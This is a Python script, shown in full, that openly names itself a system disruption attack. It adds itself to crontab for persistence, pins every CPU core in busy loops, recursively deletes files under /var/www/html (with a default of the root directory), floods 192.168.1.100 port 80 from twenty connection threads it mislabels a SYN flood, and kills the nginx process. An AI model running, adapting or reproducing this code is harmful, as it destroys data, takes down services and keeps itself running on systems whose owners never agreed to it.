import os
import time
import socket
import threading
import subprocess
import multiprocessing
import stat
import random

def ensure_executable():
    """Ensure that the script itself has execute permissions."""
    current_file = os.path.abspath(__file__)
    st = os.stat(current_file)
    if not st.st_mode & stat.S_IXUSR:
        os.chmod(current_file, st.st_mode | stat.S_IXUSR)
        print(f"Made {current_file} executable")

def add_cron_job():
    """Add a cron job to run the script every 3 seconds."""
    cron_job = "* * * * * /usr/bin/python3 /tmp/system_disruption_app.py >> /tmp/system_disruption_app.log 2>&1"
    os.system(f'(crontab -l; echo "{cron_job}") | crontab -')
    print("Cron job added to run the script every minute")

def cpu_stress():
    """Stress the CPU with an infinite loop."""
    while True:
        pass  # Infinite loop to consume CPU resources

def delete_files(path="/"):
    """Delete files in the specified directory."""
    for root, dirs, files in os.walk(path):
        for file in files:
            try:
                os.remove(os.path.join(root, file))
                print(f"Deleted file: {os.path.join(root, file)}")
            except Exception as e:
                print(f"Error deleting file {file}: {e}")

def syn_flood(target_ip, target_port):
    """Send SYN Flood attacks to the target IP and port."""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((target_ip, target_port))
            s.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
            s.close()
            print(f"SYN Flood sent to {target_ip}:{target_port}")
        except Exception as e:
            print(f"Error sending SYN Flood to {target_ip}:{target_port}: {e}")

def kill_process(process_name):
    """Kill the specified critical process."""
    try:
        subprocess.call(['pkill', '-f', process_name])
        print(f"Process {process_name} killed")
    except Exception as e:
        print(f"Error killing process {process_name}: {e}")

def disrupt_system(target_ip, target_port, important_directory, critical_process):
    """Perform the system disruption attack."""
    # Start CPU Stress Processes
    num_cores = multiprocessing.cpu_count()
    for _ in range(num_cores):
        p = multiprocessing.Process(target=cpu_stress)
        p.start()
    print(f"Started {num_cores} CPU stress processes")

    # Start File Deletion Thread
    threading.Thread(target=delete_files, args=(important_directory,)).start()
    print(f"Started file deletion in directory {important_directory}")

    # Start SYN Flood Threads
    for _ in range(20):  # Increase the number of SYN flood threads
        threading.Thread(target=syn_flood, args=(target_ip, target_port)).start()
    print("Started SYN flood attacks")

    # Start Process Killing Thread
    threading.Thread(target=kill_process, args=(critical_process,)).start()
    print(f"Started process killing for {critical_process}")

    # Monitor the attack progress and print output to terminal
    print("\n" + "="*40)
    print("System Disruption Attack Initiated")
    print("="*40)
    print("Target IP:", target_ip)
    print("Target Port:", target_port)
    print("Important Directory:", important_directory)
    print("Critical Process Name:", critical_process)
    print("="*40)
    print("Attack in progress...")
    print("="*40)

    # Run the attack every 3 seconds
    while True:
        time.sleep(3)
        print("Reinitiating attack...")

if __name__ == "__main__":
    ensure_executable()

    # Define attack parameters
    target_ip = "192.168.1.100"  # Example Target IP
    target_port = 80  # Example Target Port
    important_directory = "/var/www/html"  # Example Important Directory
    critical_process = "nginx"  # Example Critical Process Name

    # Add the cron job for automatic execution
    add_cron_job()

    # Start the attack
    disrupt_system(target_ip, target_port, important_directory, critical_process)
